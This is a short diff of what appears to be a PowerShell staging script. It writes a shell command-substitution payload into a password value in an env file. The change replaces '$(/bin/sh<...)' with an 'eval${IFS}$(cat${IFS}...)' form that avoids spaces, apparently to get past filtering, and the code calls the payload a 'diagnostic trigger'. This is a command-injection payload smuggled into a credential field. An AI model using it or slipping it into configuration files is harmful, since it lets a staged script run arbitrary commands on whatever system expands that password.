@@ -216,7 +216,7 @@ if ($Action -eq 'PrepareStaged') {
 
     # The password carries only a short fixed-script invocation, never the
     # survey body, URL, network address or a long combined shell expression.
-    $probe = '$(/bin/sh<' + $stageRemote + ')'
+    $probe = '$(eval${IFS}$(cat${IFS}' + $stageRemote + '))'
     if ($probe.Length -gt 90) { throw 'Short diagnostic trigger unexpectedly long.' }
     Copy-Item -LiteralPath $envFile -Destination $backup -ErrorAction Stop
     try {
